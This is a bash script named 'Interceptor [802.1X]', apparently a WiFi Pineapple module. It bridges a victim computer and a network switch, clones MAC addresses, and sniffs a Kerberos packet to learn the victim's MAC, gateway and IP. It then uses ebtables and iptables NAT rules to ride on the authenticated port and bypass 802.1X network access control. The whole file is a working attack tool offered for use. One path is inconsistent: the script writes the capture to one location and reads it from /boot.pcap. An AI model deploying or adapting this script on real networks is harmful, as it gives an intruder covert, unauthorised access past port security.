#!/bin/bash

MYPATH="$(dirname $0)/"
LOG=${MYPATH}log

rm ${LOG}
rm ${MYPATH}boot.pcap

#pre populated variables
SWINT=eth1
SWMAC=`ifconfig $SWINT | grep -i hwaddr | awk '{ print $5 }'`
BRINT=br-interceptor
COMPINT=eth0
BRIP=169.254.66.66
DEFGW=169.254.66.1
RANGE=61000-62000

echo -e "Starting Interceptor [802.1X]..." > ${LOG}

echo -e "Bridge: ${BRINT}" >> ${LOG}

# Remove eth0 from pineapple br-lan
brctl delif br-lan eth0 >> ${LOG}

#build the bridge
brctl addbr $BRINT >> ${LOG}
brctl addif $BRINT $COMPINT >> ${LOG}
brctl addif $BRINT $SWINT >> ${LOG}

echo 8 > /sys/class/net/$BRINT/bridge/group_fwd_mask

#bring up both sides of the bridge
ifconfig $COMPINT 0.0.0.0 up promisc >> ${LOG}
ifconfig $SWINT 0.0.0.0 up promisc >> ${LOG}

# ensure the bridge has the right MAC
macchanger -m $SWMAC $BRINT >> ${LOG}

#bring up the bridge (transparent)
ifconfig $BRINT 0.0.0.0 up promisc >> ${LOG}

# force the link to reset
mii-tool -r $COMPINT >> ${LOG}
mii-tool -r $SWINT >> ${LOG}

#grab a single tcp port 88 packet destined for the DC (kerberos)
tcpdump -i $COMPINT -s0 -w ${MYPATH}boot.pcap -c1 tcp dst port 88 
sleep 15

#set our variables
COMPMAC=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port 88 | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}'`
GWMAC=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port 88 | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $2}'`
COMIP=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port 88 | awk '{print $3","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $3}'`

echo -e "Computer MAC: ${COMPMAC}" >> ${LOG}
echo -e "Gateway MAC: ${GWMAC}" >> ${LOG}
echo -e "Computer IP: ${COMIP}" >> ${LOG}

#start dark
arptables -A OUTPUT -j DROP
iptables -A OUTPUT -j DROP

# bring up the bridge with our bridge IP
ifconfig $BRINT $BRIP up promisc >> ${LOG}

# creat to source NAT the $COMPMAC for traffic leaving the device from the bridge mac address
ebtables -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
ebtables -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC

# a static arp entry four our bogus default gateway
arp -s -i $BRINT $DEFGW $GWMAC

#add our default gateway
route add default gw $DEFGW

# set up the source nat rules for tcp/udp/icmp
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP

#lift radio silence
arptables -D OUTPUT -j DROP
iptables -D OUTPUT -j DROP

rm ${MYPATH}boot.pcap

echo -e "Interceptor [802.1X] is running..." >> ${LOG}